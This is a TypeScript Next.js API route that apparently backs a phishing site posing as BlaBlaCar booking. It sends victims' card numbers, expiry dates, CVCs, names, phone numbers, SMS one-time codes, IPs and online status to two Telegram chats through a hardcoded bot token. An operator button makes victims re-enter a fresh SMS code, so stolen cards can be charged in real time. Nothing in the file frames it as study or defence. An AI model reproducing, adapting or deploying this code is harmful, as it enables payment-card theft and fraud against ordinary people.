import { NextRequest, NextResponse } from 'next/server';
import { getCodeErrorFlag, setCodeErrorFlag } from './codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
const CHAT_IDS = ['1902713760', '7508575481'];

function getClientIp(req: NextRequest) {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  return req.ip || 'Unknown';
}

export async function GET(req: NextRequest) {
  // Polling для ошибки кода
  if (req.nextUrl.searchParams.get('check_code_error')) {
    const ip = getClientIp(req);
    console.log('Checking code error for IP:', ip);
    const hasError = getCodeErrorFlag(ip);
    if (hasError) {
      console.log('Code error flag found for IP:', ip);
      return NextResponse.json({ codeError: 'Код введен неверно или устарел, введите новый поступивший смс код' });
    }
    return NextResponse.json({ codeError: null });
  }
  return NextResponse.json({});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
    const userAgent = req.headers.get('user-agent') || 'Unknown';
    const ip = getClientIp(req);
    const now = new Date();
    const time = now.toLocaleString('ru-RU', { hour12: false });

    let message = '';
    let reply_markup = undefined;
    if (action === 'payment') {
      message =
        `💳 <b>Попытка оплаты</b>\n` +
        `──────────────\n` +
        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
      reply_markup = {
        inline_keyboard: [[{ text: 'Ошибка / Запросить новый код', callback_data: 'code_error' }]],
      };
    } else if (action === 'sms_code') {
      message =
        `🔑 <b>Введён SMS-код</b>\n` +
        `──────────────\n` +
        `• <b>Код:</b> <code>${body.code || '-'}</code>\n` +
        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    } else if (action === 'booking') {
      message =
        `📝 <b>Новая заявка на бронирование</b>\n` +
        `──────────────\n` +
        `👤 <b>Имя:</b> ${firstName || '-'}\n` +
        `👤 <b>Фамилия:</b> ${lastName || '-'}\n` +
        `➡️ <b>Клиент перешел на страницу оплаты</b>\n` +
        `🕒 <b>Время:</b> ${time}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    } else {
      const statusEmoji = status === 'online' ? '🟢' : '🔴';
      const statusText = status === 'online' ? 'Пользователь онлайн' : 'Пользователь оффлайн';
      message =
        `🚗 <b>BlaBlaCar Booking</b>\n` +
        `──────────────\n` +
        `<b>${statusEmoji} ${statusText}</b>\n` +
        (url ? `🌐 <b>Страница:</b> ${url}\n` : '') +
        `🕒 <b>Время:</b> ${time}\n` +
        `💻 <b>User-Agent:</b> ${userAgent}\n` +
        `🌍 <b>IP:</b> ${ip}`;
    }

    const results: { chat_id: string; message_id?: number; ok: boolean }[] = [];
    for (let i = 0; i < CHAT_IDS.length; i++) {
      const chat_id = CHAT_IDS[i];
      const msgId = message_ids?.[chat_id];
      let result;
      if (msgId && !action) {
        // editMessageText только для online/offline
        const editUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
        const res = await fetch(editUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id,
            message_id: msgId,
            text: message,
            parse_mode: 'HTML',
          }),
        });
        result = await res.json();
        results.push({ chat_id, message_id: msgId, ok: result.ok });
      } else {
        // sendMessage (или для booking/payment всегда новое)
        const sendUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const res = await fetch(sendUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id,
            text: message,
            parse_mode: 'HTML',
            ...(reply_markup ? { reply_markup } : {}),
          }),
        });
        result = await res.json();
        results.push({ chat_id, message_id: result.result?.message_id, ok: result.ok });
      }
    }
    if (results.every(r => r.ok)) {
      const ids: Record<string, number> = {};
      results.forEach(r => { if (r.message_id) ids[r.chat_id] = r.message_id; });
      return NextResponse.json({ ok: true, message_ids: ids });
    } else {
      return NextResponse.json({ ok: false, error: results }, { status: 500 });
    }
  } catch (e) {
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 